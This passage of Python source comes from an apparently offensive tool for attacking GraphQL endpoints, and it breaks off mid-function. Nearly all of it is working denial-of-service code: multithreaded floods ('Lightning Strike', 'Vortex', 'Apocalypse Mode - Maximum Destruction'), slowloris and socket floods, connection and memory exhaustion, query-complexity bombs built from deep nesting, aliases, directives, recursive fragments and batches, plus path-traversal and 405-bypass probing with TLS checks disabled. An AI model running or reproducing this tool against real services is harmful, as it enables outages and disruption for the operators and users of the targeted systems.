    def advanced_405_bypass(self):
        """Advanced 405 bypass techniques"""
        print("\n" + "=" * 80)
        print("ADVANCED 405 BYPASS")
        print("=" * 80)
        
        print("\nExecuting all 405 bypass techniques...")
        
        # 1. Method discovery
        print("\n[1/8] Method Discovery...")
        self.method_discovery_attack()
        
        # 2. Header fuzzing
        print("\n[2/8] Header Fuzzing...")
        self.header_fuzzing_attack()
        
        # 3. Parameter fuzzing
        print("\n[3/8] Parameter Fuzzing...")
        self.parameter_fuzzing_attack()
        
        # 4. Content-type testing
        print("\n[4/8] Content-Type Testing...")
        self.content_type_attack()
        
        # 5. Subdomain discovery
        print("\n[5/8] Subdomain Discovery...")
        self.subdomain_discovery_attack()
        
        # 6. Port scanning
        print("\n[6/8] Port Scanning...")
        self.port_scan_attack()
        
        # 7. Path traversal
        print("\n[7/8] Path Traversal...")
        self.path_traversal_attack()
        
        # 8. Case variation
        print("\n[8/8] Case Variation...")
        self.case_variation_attack()
        
        print("\n" + "=" * 80)
        print("405 BYPASS COMPLETE")
        print("=" * 80)

    def port_scan_attack(self):
        """Scan common ports"""
        print("\nScanning common ports...")
        
        parsed = urlparse(self.base_target)
        hostname = parsed.hostname
        
        common_ports = [80, 443, 8080, 8443, 3000, 4000, 5000, 8000, 9000, 3001, 4001, 5001]
        
        for port in common_ports:
            try:
                url = f"{parsed.scheme}://{hostname}:{port}/graphql"
                
                response = self.session.get(url, timeout=3, verify=False)
                
                if response.status_code != 404 and response.status_code != 403:
                    print(f"  Port {port}: HTTP {response.status_code}")
                    
            except:
                continue

    def path_traversal_attack(self):
        """Try path traversal"""
        print("\nTrying path traversal...")
        
        paths = [
            "/../graphql",
            "/api/../graphql",
            "/v1/../graphql",
            "/api/v1/../../graphql",
            "/admin/..%2fgraphql",
            "/api/..;/graphql",
            "/api/..%00/graphql",
            "/api/..%0d/graphql",
            "/api/..%0a/graphql",
            "/api/..%09/graphql",
        ]
        
        for path in paths:
            try:
                url = f"{self.base_target}{path}"
                
                response = self.session.get(url, timeout=3, verify=False)
                
                if response.status_code != 404 and response.status_code != 403:
                    print(f"  {path}: HTTP {response.status_code}")
                    
            except:
                continue

    def case_variation_attack(self):
        """Try case variations"""
        print("\nTrying case variations...")
        
        variations = [
            "/GraphQL",
            "/GRAPHQL",
            "/Graphql",
            "/gRaPhQl",
            "/Api/GraphQL",
            "/API/GRAPHQL",
        ]
        
        for variation in variations:
            try:
                url = f"{self.base_target}{variation}"
                
                response = self.session.get(url, timeout=3, verify=False)
                
                if response.status_code != 404 and response.status_code != 403:
                    print(f"  {variation}: HTTP {response.status_code}")
                    
            except:
                continue

    # =================================================================
    # ORIGINAL ATTACK MODES (UPDATED FOR 405 HANDLING)
    # =================================================================

    def lightning_strike(self):
        """Fast, aggressive DoS attack"""
        print("\n" + "=" * 80)
        print("LIGHTNING STRIKE - FAST AGGRESSIVE DoS")
        print("=" * 80)
        
        # First find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No working endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        method = self.working_endpoints[0]['method']
        content_type = self.working_endpoints[0]['content_type']
        
        print(f"Target: {endpoint}")
        print(f"Method: {method}")
        print(f"Content-Type: {content_type}")
        
        duration = int(input("Attack duration (seconds, 10-300) [30]: ").strip() or "30")
        intensity = int(input("Attack intensity (1-500 threads) [100]: ").strip() or "100")
        
        print(f"\nLaunching Lightning Strike with {intensity} threads for {duration} seconds...")
        
        # Start monitoring
        self.stop_signal = False
        monitor_thread = threading.Thread(target=self.attack_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Generate aggressive payloads
        payloads = self.generate_aggressive_payloads(50)
        
        # Launch attack threads
        threads = []
        for i in range(min(intensity, 500)):
            t = threading.Thread(target=self.lightning_worker, args=(endpoint, method, content_type, payloads))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Let it run
        print(f"\nAttack in progress - {duration} seconds remaining")
        start_time = time.time()
        
        while time.time() - start_time < duration and not self.stop_signal:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            stats = f"Time: {remaining:3d}s | Active: {self.active_attacks:3d} | "
            stats += f"Success: {self.success_count:5d} | Fails: {self.fail_count:5d} | "
            stats += f"Timeouts: {self.timeout_count:5d}"
            
            if self.rate_limit_count > 0:
                stats += f" | Rate Limits: {self.rate_limit_count}"
            
            print(f"\r{stats}", end="", flush=True)
            time.sleep(1)
        
        self.stop_signal = True
        time.sleep(2)
        
        print("\n\nAttack complete. Generating report...")
        self.generate_assault_report()

    def lightning_worker(self, endpoint, method, content_type, payloads):
        """Worker for lightning strike attack"""
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = random.choice(payloads)
                
                # Random delay
                time.sleep(random.uniform(0.001, 0.01))
                
                # Prepare headers
                headers = self.get_headers_for_test(method, content_type)
                
                # Send request
                start = time.time()
                
                if method == 'GET':
                    parsed = urlparse(endpoint)
                    query_str = f"?query={urllib.parse.quote(json.dumps(payload))}" if isinstance(payload, dict) else f"?query={urllib.parse.quote(payload)}"
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}{query_str}"
                    response = self.session.get(test_url, timeout=random.uniform(2, 10), headers=headers, verify=False)
                else:
                    if content_type == 'application/json':
                        response = self.session.request(method, endpoint, json=payload, timeout=random.uniform(2, 10), headers=headers, verify=False)
                    else:
                        response = self.session.request(method, endpoint, data=payload, timeout=random.uniform(2, 10), headers=headers, verify=False)
                
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    self.success_count += 1
                    # Check for GraphQL errors
                    try:
                        data = response.json()
                        if 'errors' in data:
                            error_msg = str(data['errors'])
                            if any(word in error_msg.lower() for word in ['timeout', 'complexity', 'depth', 'memory', 'limit']):
                                self.attack_results.append(f"GraphQL error: {error_msg[:100]}")
                    except:
                        pass
                elif response.status_code == 429:
                    self.rate_limit_count += 1
                    self.attack_results.append("Rate limit triggered (429)")
                elif response.status_code == 503:
                    self.attack_results.append("Service unavailable (503)")
                elif response.status_code >= 500:
                    self.attack_results.append(f"Server error: HTTP {response.status_code}")
                else:
                    self.fail_count += 1
                    
            except requests.exceptions.Timeout:
                self.timeout_count += 1
                self.attack_results.append("Request timeout")
            except requests.exceptions.ConnectionError:
                self.fail_count += 1
                self.attack_results.append("Connection error")
            except Exception as e:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1

    def generate_aggressive_payloads(self, count):
        """Generate aggressive GraphQL payloads"""
        payloads = []
        
        # Payload 1: Deep nesting (100 levels)
        deep_query = "{"
        for i in range(100):
            deep_query += f"level{i}: __typename "
            if i < 99:
                deep_query += "{ "
        
        deep_query += "}" * 100 + " }"
        payloads.append({"query": deep_query})
        
        # Payload 2: Field duplication (500 fields)
        field_query = "{"
        for i in range(500):
            field_query += f"field{i}: __typename "
        field_query += "}"
        payloads.append({"query": field_query})
        
        # Payload 3: Recursive fragments
        recursive_payload = """
        query Attack {
          ...Frag1
          ...Frag2
          ...Frag3
        }
        fragment Frag1 on Query {
          __typename
          ...Frag2
        }
        fragment Frag2 on Query {
          __typename
          ...Frag3
        }
        fragment Frag3 on Query {
          __typename
          ...Frag1
        }
        """
        payloads.append({"query": recursive_payload})
        
        # Payload 4: Batch attack (20 queries)
        batch_payload = []
        for i in range(20):
            batch_payload.append({"query": f"query Q{i} {{ __typename " + " ".join([f"alias{j}:__typename" for j in range(20)]) + " }"})
        payloads.append(batch_payload)
        
        # Payload 5: Directive spam (100 directives)
        directive_query = "query { __typename"
        for i in range(100):
            directive_query += f" @include(if: true) @skip(if: false)"
        directive_query += " }"
        payloads.append({"query": directive_query})
        
        # Payload 6: Introspection query
        introspection_query = """
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            subscriptionType { name }
            types {
              ...FullType
            }
            directives {
              name
              description
              locations
              args {
                ...InputValue
              }
            }
          }
        }
        fragment FullType on __Type {
          kind
          name
          description
          fields(includeDeprecated: true) {
            name
            description
            args {
              ...InputValue
            }
            type {
              ...TypeRef
            }
            isDeprecated
            deprecationReason
          }
          inputFields {
            ...InputValue
          }
          interfaces {
            ...TypeRef
          }
          enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
          }
          possibleTypes {
            ...TypeRef
          }
        }
        fragment InputValue on __InputValue {
          name
          description
          type { ...TypeRef }
          defaultValue
        }
        fragment TypeRef on __Type {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                }
              }
            }
          }
        }
        """
        payloads.append({"query": introspection_query})
        
        # Payload 7: Large variables
        variable_query = """
        query VariableBomb($v0: String, $v1: String, $v2: String, $v3: String, $v4: String,
                          $v5: String, $v6: String, $v7: String, $v8: String, $v9: String) {
          __typename
        }
        """
        variables = {}
        for i in range(10):
            variables[f"v{i}"] = "x" * 10000
        
        payloads.append({
            "query": variable_query,
            "variables": variables
        })
        
        # Payload 8: Union/interface abuse
        union_query = """
        query UnionAttack {
          __schema {
            types {
              name
              ... on __UnionType {
                possibleTypes {
                  name
                  fields {
                    name
                    type {
                      name
                    }
                  }
                }
              }
              ... on __InterfaceType {
                possibleTypes {
                  name
                  fields {
                    name
                    type {
                      name
                    }
                  }
                }
              }
            }
          }
        }
        """
        payloads.append({"query": union_query})
        
        # Generate random variations
        for i in range(count - 8):
            query_type = random.choice(['simple', 'deep', 'wide', 'directive', 'fragment'])
            
            if query_type == 'simple':
                query = "{ __typename }"
            elif query_type == 'deep':
                depth = random.randint(5, 50)
                query = "{"
                for j in range(depth):
                    query += f"level{j}: __typename "
                    if j < depth - 1:
                        query += "{ "
                query += "}" * depth + " }"
            elif query_type == 'wide':
                width = random.randint(10, 200)
                query = "{"
                for j in range(width):
                    query += f"field{j}: __typename "
                query += "}"
            elif query_type == 'directive':
                num_directives = random.randint(5, 50)
                query = "query { __typename"
                for j in range(num_directives):
                    query += f" @include(if: {random.choice(['true', 'false'])})"
                query += " }"
            else:  # fragment
                query = """
                query {
                  ...Frag1
                }
                fragment Frag1 on Query {
                  __typename
                }
                """
            
            payloads.append({"query": query})
        
        # Add some raw string payloads
        for i in range(5):
            payloads.append(random.choice(payloads)['query'])
        
        return payloads

    def vortex_attack(self):
        """Multi-vector saturation attack"""
        print("\n" + "=" * 80)
        print("VORTEX ATTACK - MULTI-VECTOR SATURATION")
        print("=" * 80)
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No working endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"Target: {endpoint}")
        
        duration = int(input("Attack duration (seconds, 30-600) [60]: ").strip() or "60")
        
        print(f"\nLaunching Vortex Attack for {duration} seconds...")
        print("Deploying 7 attack vectors simultaneously...")
        
        self.stop_signal = False
        
        # Start monitoring
        monitor_thread = threading.Thread(target=self.attack_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Launch different attack vectors
        vectors = []
        
        # Vector 1: Query complexity attack
        t1 = threading.Thread(target=self.complexity_attack, args=(endpoint,))
        t1.daemon = True
        t1.start()
        vectors.append(t1)
        
        # Vector 2: Connection exhaustion
        t2 = threading.Thread(target=self.connection_attack, args=(endpoint,))
        t2.daemon = True
        t2.start()
        vectors.append(t2)
        
        # Vector 3: Memory exhaustion
        t3 = threading.Thread(target=self.memory_attack, args=(endpoint,))
        t3.daemon = True
        t3.start()
        vectors.append(t3)
        
        # Vector 4: Parser attack
        t4 = threading.Thread(target=self.parser_attack, args=(endpoint,))
        t4.daemon = True
        t4.start()
        vectors.append(t4)
        
        # Vector 5: Mixed payload attack
        t5 = threading.Thread(target=self.mixed_attack, args=(endpoint,))
        t5.daemon = True
        t5.start()
        vectors.append(t5)
        
        # Vector 6: Batch attack
        t6 = threading.Thread(target=self.batch_attack_worker, args=(endpoint,))
        t6.daemon = True
        t6.start()
        vectors.append(t6)
        
        # Vector 7: Slowloris attack
        t7 = threading.Thread(target=self.slowloris_attack, args=(endpoint,))
        t7.daemon = True
        t7.start()
        vectors.append(t7)
        
        # Monitor
        start_time = time.time()
        while time.time() - start_time < duration and not self.stop_signal:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            status = f"Time: {remaining:3d}s | Active: {self.active_attacks:3d} | Success: {self.success_count:5d}"
            if self.rate_limit_count > 0:
                status += f" | Rate Limits: {self.rate_limit_count}"
            
            print(f"\r{status}", end="", flush=True)
            time.sleep(1)
        
        self.stop_signal = True
        time.sleep(3)
        
        print("\n\nVortex complete...")
        self.generate_assault_report()

    def complexity_attack(self, endpoint):
        """Attack via query complexity"""
        complex_queries = [
            {"query": "{ users { edges { node { friends { edges { node { posts { edges { node { comments { edges { node { id } } } } } } } } } } } } }"},
            {"query": "{ a: __typename b: __typename c: __typename d: __typename e: __typename " * 50 + "}"},
            {"query": "{ ... on Query { ... on Query { ... on Query { ... on Query { ... on Query { __typename } } } } } }"},
            {"query": self.generate_aggressive_payloads(1)[0]['query']},
        ]
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = random.choice(complex_queries)
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = self.session.post(endpoint, json=payload, timeout=8, headers=headers, verify=False)
                
                if response.status_code != 200:
                    self.attack_results.append(f"Complexity attack: HTTP {response.status_code}")
                    
            except Exception as e:
                pass
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.05, 0.2))

    def connection_attack(self, endpoint):
        """Exhaust connection pool"""
        connections = []
        
        while not self.stop_signal and len(connections) < 200:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = self.session.post(endpoint, json={"query": "{__typename}"}, stream=True, timeout=30, headers=headers, verify=False)
                connections.append(response)
                self.active_attacks += 1
                
                # Send keep-alive headers periodically
                if random.random() > 0.7:
                    try:
                        response.raw._fp.fp.raw._sock.send(b'X-Connection-Keep-Alive: true\r\n\r\n')
                    except:
                        pass
                        
            except:
                pass
            
            time.sleep(0.05)
        
        # Hold connections open
        hold_start = time.time()
        while time.time() - hold_start < 30 and not self.stop_signal:
            time.sleep(1)
        
        # Clean up
        for conn in connections:
            try:
                conn.close()
            except:
                pass
            self.active_attacks -= 1

    def memory_attack(self, endpoint):
        """Attempt to exhaust memory with large responses"""
        memory_queries = [
            {"query": "{ __schema { types { name fields { name type { name } } } } }"},
            {"query": "{ search(query: \"*\") { id name description } }"},
            {"query": self.generate_introspection_query()},
        ]
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = random.choice(memory_queries)
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = self.session.post(endpoint, json=payload, timeout=15, headers=headers, verify=False)
                
                if len(response.content) > 100000:
                    self.attack_results.append(f"Large response: {len(response.content)} bytes")
                    
            except Exception as e:
                pass
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.1, 0.5))

    def parser_attack(self, endpoint):
        """Attack the GraphQL parser with malformed queries"""
        malformed_payloads = [
            "{invalid json}",
            "query {",
            "{" * 1000 + "}" * 1000,
            '{"query": "' + '\\u0000' * 10000 + '"}',
            '[' * 1000 + ']' * 1000,
            'null',
            'true',
            'false',
            '0',
            '""',
            '{}',
            '[]',
            '{"query": null}',
            '{"query": true}',
            '{"query": 123}',
            '{"query": []}',
            '{"query": {}}',
            '{"query": "{"}',
            '{"query": "}"}',
            '{"query": "\\""}',
        ]
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = random.choice(malformed_payloads)
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                self.session.post(endpoint, data=payload, timeout=5, headers=headers, verify=False)
            except:
                pass
            finally:
                self.active_attacks -= 1
            
            time.sleep(0.02)

    def mixed_attack(self, endpoint):
        """Mixed payload attack"""
        payloads = self.generate_aggressive_payloads(20)
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                attack_type = random.randint(1, 6)
                
                if attack_type == 1:
                    payload = {"query": "{" + " ".join([f"f{i}:__typename" for i in range(random.randint(5, 100))]) + "}"}
                elif attack_type == 2:
                    batch = []
                    for i in range(random.randint(3, 20)):
                        batch.append({"query": f"query Q{i} {{ __typename }}"})
                    payload = batch
                elif attack_type == 3:
                    payload = {"query": "{" + "x" * random.randint(1000, 10000) + "}"}
                elif attack_type == 4:
                    payload = {"query": "{ __typename " * random.randint(5, 50) + "}" * random.randint(5, 50)}
                elif attack_type == 5:
                    payload = random.choice(payloads)
                else:
                    payload = {"query": "query { __typename @include(if: true)" + " @skip(if: false)" * random.randint(10, 100) + " }"}
                
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = self.session.post(endpoint, json=payload, timeout=10, headers=headers, verify=False)
                
                if response.status_code == 200:
                    self.success_count += 1
                    
            except Exception as e:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.01, 0.1))

    def batch_attack_worker(self, endpoint):
        """Batch query attack worker"""
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                # Create batch of queries
                batch = []
                for i in range(random.randint(5, 50)):
                    batch.append({
                        "query": f"query BatchQuery{i} {{ __typename " + 
                                " ".join([f"field{j}: __typename" for j in range(random.randint(5, 20))]) + 
                                " }"
                    })
                
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = self.session.post(endpoint, json=batch, timeout=15, headers=headers, verify=False)
                
                if response.status_code == 200:
                    self.success_count += 1
                    try:
                        data = response.json()
                        if isinstance(data, list) and len(data) > 10:
                            self.attack_results.append(f"Batch attack: {len(data)} queries processed")
                    except:
                        pass
                        
            except Exception as e:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.05, 0.3))

    def slowloris_attack(self, endpoint):
        """Slowloris-style attack"""
        parsed = urlparse(endpoint)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        # Create partial HTTP requests
        request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
        request += f"Host: {hostname}\r\n"
        request += "User-Agent: Mozilla/5.0\r\n"
        request += "Content-Type: application/json\r\n"
        request += f"Content-Length: {1000000}\r\n"
        request += "\r\n"
        
        # Send initial headers
        request += '{"query": "'
        
        sockets = []
        
        try:
            while not self.stop_signal and len(sockets) < 100:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    
                    if parsed.scheme == 'https':
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=hostname)
                    
                    sock.connect((hostname, port))
                    sock.send(request.encode())
                    sockets.append(sock)
                    self.active_attacks += 1
                    
                except:
                    break
                
                time.sleep(0.1)
            
            # Keep connections alive by sending data slowly
            start_time = time.time()
            while time.time() - start_time < 60 and not self.stop_signal:
                for sock in sockets:
                    try:
                        sock.send(b' ')
                        time.sleep(10)  # Send one byte every 10 seconds
                    except:
                        pass
                
        finally:
            # Clean up
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
                self.active_attacks -= 1

    def apocalypse_mode(self):
        """Maximum destruction mode"""
        print("\n" + "=" * 80)
        print("APOCALYPSE MODE - MAXIMUM DESTRUCTION")
        print("=" * 80)
        
        print("WARNING: This mode is extremely aggressive")
        print("May trigger alarms and cause actual disruption")
        print("Use with extreme caution!")
        
        confirm = input("\nType 'APOCALYPSE' to confirm: ")
        if confirm != "APOCALYPSE":
            print("Aborted.")
            return
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No working endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        duration = 180  # 3 minutes
        
        print(f"\nInitiating apocalypse sequence...")
        print(f"Target: {endpoint}")
        print(f"Duration: {duration} seconds")
        
        time.sleep(2)
        
        print("\nStarting attack...")
        
        self.stop_signal = False
        
        # Start all attack vectors at maximum intensity
        vectors = []
        
        # 1. Socket flood attack
        t1 = threading.Thread(target=self.socket_flood, args=(endpoint,))
        t1.daemon = True
        t1.start()
        vectors.append(t1)
        
        # 2. 200-thread query storm
        for i in range(50):
            t = threading.Thread(target=self.apocalypse_worker, args=(endpoint,))
            t.daemon = True
            t.start()
            vectors.append(t)
        
        # 3. Memory exhaustion
        t3 = threading.Thread(target=self.memory_exhaustion_attack, args=(endpoint,))
        t3.daemon = True
        t3.start()
        vectors.append(t3)
        
        # 4. Connection exhaustion
        t4 = threading.Thread(target=self.connection_exhaustion_attack, args=(endpoint,))
        t4.daemon = True
        t4.start()
        vectors.append(t4)
        
        # Monitor
        start_time = time.time()
        while time.time() - start_time < duration and not self.stop_signal:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            stats = f"Time: {elapsed:3d}s | Threads: {threading.active_count():3d} | "
            stats += f"Success: {self.success_count:6d} | Fails: {self.fail_count:6d} | "
            stats += f"Timeouts: {self.timeout_count:6d}"
            
            print(f"\r{stats}", end="", flush=True)
            
            if self.timeout_count > 5000 or self.fail_count > 10000:
                print(f"\nCatastrophic failure detected!")
                self.attack_results.append("Catastrophic service failure achieved")
                break
            
            time.sleep(1)
        
        self.stop_signal = True
        time.sleep(5)
        
        print("\n\nApocalypse complete")
        self.generate_assault_report()

    def apocalypse_worker(self, endpoint):
        """Worker for apocalypse mode"""
        payloads = self.generate_aggressive_payloads(100)
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                # Send multiple requests in quick succession
                for i in range(random.randint(1, 10)):
                    payload = random.choice(payloads)
                    headers = {'User-Agent': random.choice(self.user_agents)}
                    
                    self.session.post(endpoint, json=payload, timeout=2, headers=headers, verify=False)
                    self.success_count += 1
                
            except Exception as e:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.001, 0.01))

    def socket_flood(self, endpoint):
        """Low-level socket flood attack"""
        parsed = urlparse(endpoint)
        hostname = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
        request += f"Host: {hostname}\r\n"
        request += "User-Agent: Mozilla/5.0\r\n"
        request += "Content-Type: application/json\r\n"
        request += f"Content-Length: {10000}\r\n"
        request += "\r\n"
        request += '{"query": "' + 'x' * 9990 + '"}'
        
        while not self.stop_signal:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                if parsed.scheme == 'https':
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=hostname)
                
                sock.connect((hostname, port))
                sock.send(request.encode())
                time.sleep(30)  # Hold connection open
                sock.close()
                
            except:
                pass

    def memory_exhaustion_attack(self, endpoint):
        """Memory exhaustion attack"""
        introspection = self.generate_introspection_query()
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = self.session.post(
                    endpoint,
                    json={"query": introspection},
                    timeout=30,
                    headers=headers,
                    verify=False
                )
                
                if len(response.content) > 50000:
                    self.attack_results.append(f"Memory attack: {len(response.content)} bytes")
                    
            except:
                pass
            finally:
                self.active_attacks -= 1
            
            time.sleep(0.5)

    def connection_exhaustion_attack(self, endpoint):
        """Connection exhaustion attack"""
        connections = []
        
        while not self.stop_signal and len(connections) < 500:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = self.session.post(
                    endpoint,
                    json={"query": "{__typename}"},
                    stream=True,
                    timeout=60,
                    headers=headers,
                    verify=False
                )
                connections.append(response)
                self.active_attacks += 1
                
            except:
                pass
            
            time.sleep(0.01)
        
        # Hold connections
        start_time = time.time()
        while time.time() - start_time < 120 and not self.stop_signal:
            time.sleep(1)
        
        # Cleanup
        for conn in connections:
            try:
                conn.close()
            except:
                pass
            self.active_attacks -= 1

    def precision_strike(self):
        """Target specific GraphQL vulnerabilities"""
        print("\n" + "=" * 80)
        print("PRECISION STRIKE - TARGET SPECIFIC VULNERABILITIES")
        print("=" * 80)
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"Target: {endpoint}")
        
        print("\nSELECT PRECISION TARGET:")
        print("1. Query Depth Limitation Bypass")
        print("2. Field Duplication Attack")
        print("3. Alias Overload Attack")
        print("4. Directive Flood Attack")
        print("5. Fragment Recursion Attack")
        print("6. Union/Interface Abuse")
        print("7. Variable Bomb Attack")
        print("8. Introspection Exploitation")
        print("9. Batch Query Attack")
        print("10. Persisted Query Attack")
        print("11. All Precision Attacks")
        
        choice = input("\nSelect target (1-11): ").strip()
        
        if choice == "1":
            self.attack_depth_limitation(endpoint)
        elif choice == "2":
            self.attack_field_duplication(endpoint)
        elif choice == "3":
            self.attack_alias_overload(endpoint)
        elif choice == "4":
            self.attack_directive_flood(endpoint)
        elif choice == "5":
            self.attack_fragment_recursion(endpoint)
        elif choice == "6":
            self.attack_union_interface_abuse(endpoint)
        elif choice == "7":
            self.attack_variable_bomb(endpoint)
        elif choice == "8":
            self.attack_introspection_exploitation(endpoint)
        elif choice == "9":
            self.attack_batch_queries(endpoint)
        elif choice == "10":
            self.attack_persisted_queries(endpoint)
        elif choice == "11":
            self.execute_all_precision_attacks(endpoint)
        else:
            print("Invalid selection!")
            return
        
        self.generate_assault_report()

    def attack_depth_limitation(self, endpoint):
        """Test query depth limitations"""
        print("\nTesting Query Depth Limitations...")
        
        depth_levels = [5, 10, 15, 20, 25, 30, 40, 50, 75, 100, 150, 200]
        
        for depth in depth_levels:
            print(f"  Testing depth {depth}...")
            
            query = "query { "
            for i in range(depth):
                query += f"level{i}: __typename "
                if i < depth - 1:
                    query += "{ "
            
            query += "}" * depth + " }"
            payload = {"query": query}
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=20, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' in data:
                        for error in data['errors']:
                            error_str = str(error).lower()
                            if 'depth' in error_str or 'complexity' in error_str or 'nesting' in error_str:
                                print(f"    DEPTH LIMIT HIT at {depth} levels: {str(error)[:80]}")
                                self.attack_results.append(f"Depth limit: {depth} levels")
                                return depth
                    else:
                        print(f"    Depth {depth} accepted ({elapsed:.2f}s)")
                        if elapsed > 5.0:
                            print(f"    Slow response at depth {depth}")
                            self.attack_results.append(f"Slow at depth {depth}: {elapsed:.2f}s")
                else:
                    print(f"    HTTP {response.status_code} at depth {depth}")
                    
            except requests.exceptions.Timeout:
                print(f"    TIMEOUT at depth {depth} - VULNERABLE!")
                self.attack_results.append(f"Timeout at depth {depth}")
                return depth
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    No depth limit detected up to 200 levels!")
        self.attack_results.append("No depth limit up to 200 levels")

    def attack_field_duplication(self, endpoint):
        """Field duplication attack"""
        print("\nTesting Field Duplication Vulnerability...")
        
        field_counts = [10, 50, 100, 200, 500, 1000, 2000, 5000]
        
        for count in field_counts:
            print(f"  Testing {count} duplicate fields...")
            
            query = "query { "
            for i in range(count):
                query += f"field: __typename "
            query += "}"
            
            payload = {"query": query}
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' in data:
                        for error in data['errors']:
                            error_str = str(error).lower()
                            if 'field' in error_str and ('unique' in error_str or 'duplicate' in error_str):
                                print(f"    FIELD DUPLICATION LIMIT at {count} fields")
                                self.attack_results.append(f"Field duplication limit: {count} fields")
                                return count
                    else:
                        print(f"    {count} duplicate fields accepted ({elapsed:.2f}s)")
                        if elapsed > 3.0:
                            print(f"    Performance impact at {count} fields")
                            self.attack_results.append(f"Slow with {count} duplicate fields: {elapsed:.2f}s")
                else:
                    print(f"    HTTP {response.status_code} with {count} fields")
                    
            except requests.exceptions.Timeout:
                print(f"    TIMEOUT with {count} duplicate fields!")
                self.attack_results.append(f"Timeout with {count} duplicate fields")
                return count
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("    No field duplication limit detected up to 5000 fields!")
        self.attack_results.append("No field duplication limit up to 5000 fields")

    def attack_alias_overload(self, endpoint):
        """Alias overload attack"""
        print("\nTesting Alias Overload Vulnerability...")
        
        alias_counts = [100, 500, 1000, 2000, 5000]
        
        for count in alias_counts:
            print(f"  Testing alias overload ({count} aliases)...")
            
            query = "query { "
            for i in range(count):
                query += f"alias{i}: __typename "
            query += "}"
            
            payload = {"query": query}
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    print(f"    {count} aliases accepted ({elapsed:.2f}s)")
                    if elapsed > 10.0:
                        print(f"    SIGNIFICANT PERFORMANCE IMPACT!")
                        self.attack_results.append(f"Alias overload: {elapsed:.2f}s for {count} aliases")
                    else:
                        self.attack_results.append(f"Accepts {count} aliases: {elapsed:.2f}s")
                elif response.status_code == 400 or response.status_code == 413:
                    print(f"    Rejected with HTTP {response.status_code}")
                    self.attack_results.append(f"Alias overload blocked at {count}: HTTP {response.status_code}")
                    return count
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
